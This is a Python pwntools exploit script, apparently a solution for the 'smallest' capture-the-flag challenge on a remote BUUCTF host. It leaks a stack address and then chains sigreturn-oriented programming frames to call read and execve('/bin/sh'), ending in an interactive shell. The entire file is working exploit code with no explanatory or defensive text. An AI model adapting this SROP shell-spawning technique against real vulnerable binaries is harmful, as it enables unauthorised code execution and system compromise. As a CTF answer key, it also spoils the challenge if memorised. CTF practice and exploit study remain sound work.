from pwn import *
from ctypes import *

context.update(arch="amd64", os="linux")
context.terminal = ["qterminal", "-e"]
context.log_level = "debug"
elf = ELF("./smallest")
p=remote('node5.buuoj.cn',25627)
#p = process("./smallest")
#gdb.attach(p,'b* 0x4000BE')
syscall_ret = 0x00000000004000BE
start_addr = 0x00000000004000B0
payload = b""
payload += p64(start_addr)
# set rax=1
payload += p64(0x00000000004000B8)
# .text:00000000004000B8 48 89 E6                      mov     rsi, rsp                        ; buf
# .text:00000000004000BB 48 89 C7                      mov     rdi, rax                        ; fd
# .text:00000000004000BE 0F 05                         syscall                                 ; LINUX - sys_read
# .text:00000000004000C0 C3                            retn
# sys_write(1, rsp, 400)
payload += p64(start_addr)
p.send(payload)
sleep(0.5)
#pause()
p.send(payload[8 : 8 + 1])
stack_addr = u64(p.recv()[8:16]) + 0x100
log.info("stack addr = %#x" % (stack_addr))
frame_read = SigreturnFrame()
frame_read.rax = constants.SYS_read
frame_read.rdi = 0
frame_read.rdx = 0x300
frame_read.rsi = stack_addr
frame_read.rsp =stack_addr
frame_read.rip = syscall_ret
payload = p64(start_addr)
payload += p64(syscall_ret)
payload += bytes(frame_read)
p.send(payload)
sleep(0.5)
#pause()
p.send(payload[8 : 8 + 15])
sleep(0.5)
#pause()
#srop start
frame_exe =SigreturnFrame()
frame_exe.rax= constants.SYS_execve
frame_exe.rdi=stack_addr+0x108
frame_exe.rsi=0
frame_exe.rdx=0
frame_exe.rsp=stack_addr
frame_exe.rip=syscall_ret
payload=p64(start_addr)
payload+=p64(syscall_ret)
payload+=bytes(frame_exe)
payload+=b'/bin/sh\x00'
p.send(payload)
sleep(0.5)
#pause()
p.send(payload[8:8+15])

p.interactive()
